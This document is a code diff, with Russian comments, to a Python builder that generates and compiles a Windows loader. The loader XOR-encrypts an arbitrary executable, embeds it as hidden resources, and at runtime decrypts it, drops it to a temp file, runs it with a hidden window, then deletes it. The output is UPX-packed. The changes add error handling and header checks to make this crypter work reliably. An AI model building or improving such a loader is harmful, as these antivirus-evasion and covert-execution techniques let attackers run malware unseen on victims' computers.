@@ -24,6 +24,12 @@ def build_single_exe_with_dll(exe_path):
     
     print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
     
+    # Проверка, что это EXE
+    if exe_data[0] != 0x4D or exe_data[1] != 0x5A:
+        print("ERROR: Not a valid EXE file (missing MZ header)!")
+        return None
+    print("EXE header OK (MZ)")
+    
     print("Encrypting with XOR...")
     key = os.urandom(32)
     encrypted = bytearray()
@@ -36,10 +42,12 @@ def build_single_exe_with_dll(exe_path):
     data_bin = os.path.join(output_dir, f'{name1}.bin')
     with open(data_bin, 'wb') as f:
         f.write(encrypted)
+    print(f"Encrypted data saved: {name1}.bin ({len(encrypted) / (1024*1024):.1f} MB)")
     
     key_bin = os.path.join(output_dir, f'{name2}.bin')
     with open(key_bin, 'wb') as f:
         f.write(key)
+    print(f"Key saved: {name2}.bin ({len(key)} bytes)")
     
     print("Creating resource file...")
     
@@ -76,28 +84,50 @@ void proc2() {{
     HMODULE h = GetModuleHandleA(NULL);
     
     HRSRC r1 = FindResourceA(h, MAKEINTRESOURCE(IDR_1), "RCDATA");
-    if (!r1) return;
+    if (!r1) {{
+        MessageBoxA(NULL, "Resource IDR_1 not found!", "Error", MB_OK);
+        return;
+    }}
     
     HGLOBAL g1 = LoadResource(h, r1);
-    if (!g1) return;
+    if (!g1) {{
+        MessageBoxA(NULL, "Failed to load IDR_1!", "Error", MB_OK);
+        return;
+    }}
     
     DWORD s1 = SizeofResource(h, r1);
     unsigned char* d1 = (unsigned char*)LockResource(g1);
     
     HRSRC r2 = FindResourceA(h, MAKEINTRESOURCE(IDR_2), "RCDATA");
-    if (!r2) return;
+    if (!r2) {{
+        MessageBoxA(NULL, "Resource IDR_2 not found!", "Error", MB_OK);
+        return;
+    }}
     
     HGLOBAL g2 = LoadResource(h, r2);
-    if (!g2) return;
+    if (!g2) {{
+        MessageBoxA(NULL, "Failed to load IDR_2!", "Error", MB_OK);
+        return;
+    }}
     
     DWORD s2 = SizeofResource(h, r2);
     unsigned char* d2 = (unsigned char*)LockResource(g2);
     
     // Расшифровываем XOR
     unsigned char* out = (unsigned char*)malloc(s1);
-    if (!out) return;
+    if (!out) {{
+        MessageBoxA(NULL, "Memory allocation failed!", "Error", MB_OK);
+        return;
+    }}
     memcpy(out, d1, s1);
     proc1(out, s1, d2, s2);
+    
+    // Проверка, что это EXE
+    if (out[0] != 0x4D || out[1] != 0x5A) {{
+        MessageBoxA(NULL, "Decrypted data is NOT a valid EXE (missing MZ header)!", "Error", MB_OK);
+        free(out);
+        return;
+    }}
     
     char tmp[MAX_PATH];
     char fn[13];
@@ -112,24 +142,39 @@ void proc2() {{
     
     HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (f != INVALID_HANDLE_VALUE) {{
-        DWORD w;
-        WriteFile(f, out, s1, &w, NULL);
-        CloseHandle(f);
-        
-        STARTUPINFOA si = {{sizeof(si)}};
-        PROCESS_INFORMATION pi;
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        
-        CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
-                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
-        
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        Sleep(9000);
-        DeleteFileA(tmp);
+    if (f == INVALID_HANDLE_VALUE) {{
+        MessageBoxA(NULL, "Failed to create temp file!", "Error", MB_OK);
+        free(out);
+        return;
     }}
+    
+    DWORD w;
+    if (!WriteFile(f, out, s1, &w, NULL) || w != s1) {{
+        MessageBoxA(NULL, "Failed to write temp file!", "Error", MB_OK);
+        CloseHandle(f);
+        DeleteFileA(tmp);
+        free(out);
+        return;
+    }}
+    CloseHandle(f);
+    
+    STARTUPINFOA si = {{sizeof(si)}};
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    if (!CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
+                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {{
+        MessageBoxA(NULL, "Failed to start process!", "Error", MB_OK);
+        DeleteFileA(tmp);
+        free(out);
+        return;
+    }}
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    Sleep(9000);
+    DeleteFileA(tmp);
     free(out);
 }}
 
@@ -149,7 +194,11 @@ int main() {{
     loader_exe = os.path.join(output_dir, exe_name)
     
     res_obj = os.path.join(output_dir, 'resource.o')
-    subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
+    result = subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
+    if result.returncode != 0:
+        print(f"Resource compilation failed: {result.stderr.decode()}")
+        return None
+    print("Resource compiled OK")
     
     cmd = [
         'gcc',
@@ -164,16 +213,18 @@ int main() {{
     ]
     
     try:
-        subprocess.run(cmd, check=True, capture_output=True)
-    except Exception as e:
-        print(f"Compilation failed: {e}")
+        result = subprocess.run(cmd, check=True, capture_output=True)
+        print("Compilation OK")
+    except subprocess.CalledProcessError as e:
+        print(f"Compilation failed: {e.stderr.decode()}")
         return None
     
-    print("Compressing...")
+    print("Compressing with UPX...")
     try:
-        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
+        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
+        print("UPX compression OK")
     except:
-        pass
+        print("UPX compression skipped or failed")
     
     final_size = os.path.getsize(loader_exe) / (1024 * 1024)
     
